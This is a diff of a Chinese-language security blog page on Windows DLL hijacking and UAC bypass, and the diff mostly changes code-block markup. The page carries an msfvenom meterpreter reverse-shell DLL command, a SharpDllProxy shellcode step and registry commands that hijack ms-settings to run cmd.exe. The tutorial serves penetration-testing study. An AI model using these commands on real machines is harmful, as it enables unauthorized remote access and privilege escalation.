+</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">DLL_PROCESS_DETACH</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Process detach. </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    	<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">DLL_THREAD_ATTACH</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Thread attach. </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    	<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">DLL_THREAD_DETACH</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Thread detach. </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    	<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="p">(</span><span class="n">TRUE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>如果应用程序调用的 DLL 没有 DLLMain 函数就需要实现指定导出函数，然后等待导出函数执行完毕再 Load 真实 DLL。</p>
 <h4 id="622-msf">6.2.2 msf</h4>
@@ -855,8 +855,8 @@ reg add HKLM<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<s
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>IP <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f dll &gt; a.dll
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>IP <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f dll &gt; a.dll
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="63-自动化工具检测">6.3 自动化工具检测</h3>
 <h4 id="631-rattler">6.3.1 rattler</h4>
@@ -877,8 +877,8 @@ reg add HKLM<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<s
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">Rattler.exe <span class="o">[</span>待检测程序名称<span class="o">]</span> <span class="m">1</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Rattler.exe <span class="o">[</span>待检测程序名称<span class="o">]</span> <span class="m">1</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="632-chkdllhijack">6.3.2 ChkDllHijack</h4>
 <p>使用 windbg 导出 module：</p>
@@ -926,8 +926,8 @@ reg add HKLM<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<s
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">SharpDllProxy.exe --dll /path/to/targetDLL.dll --payload shellcode.bin
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SharpDllProxy.exe --dll /path/to/targetDLL.dll --payload shellcode.bin
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -1109,9 +1109,9 @@ reg add HKLM<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<s
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">reg add HKEY_CURRENT_USER<span class="se">\S</span>oftware<span class="se">\C</span>lasses<span class="se">\m</span>s-settings<span class="se">\s</span>hell<span class="se">\o</span>pen<span class="se">\c</span>ommand /d C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe /f
-reg add HKEY_CURRENT_USER<span class="se">\S</span>oftware<span class="se">\C</span>lasses<span class="se">\m</span>s-settings<span class="se">\s</span>hell<span class="se">\o</span>pen<span class="se">\c</span>ommand /v DelegateExecute /t REG_DWORD /d <span class="m">00000000</span> /f
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">reg add HKEY_CURRENT_USER<span class="se">\S</span>oftware<span class="se">\C</span>lasses<span class="se">\m</span>s-settings<span class="se">\s</span>hell<span class="se">\o</span>pen<span class="se">\c</span>ommand /d C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe /f
+</span></span><span class="line"><span class="cl">reg add HKEY_CURRENT_USER<span class="se">\S</span>oftware<span class="se">\C</span>lasses<span class="se">\m</span>s-settings<span class="se">\s</span>hell<span class="se">\o</span>pen<span class="se">\c</span>ommand /v DelegateExecute /t REG_DWORD /d <span class="m">00000000</span> /f
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>在 msf 中已经集成了相应的利用方式。</p>
 <h3 id="74-uacme">7.4 UACME</h3>
@@ -1181,7 +1181,7 @@ reg add HKEY_CURRENT_USER<span class="se">\S</span>oftware<span class="se">\C</s
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
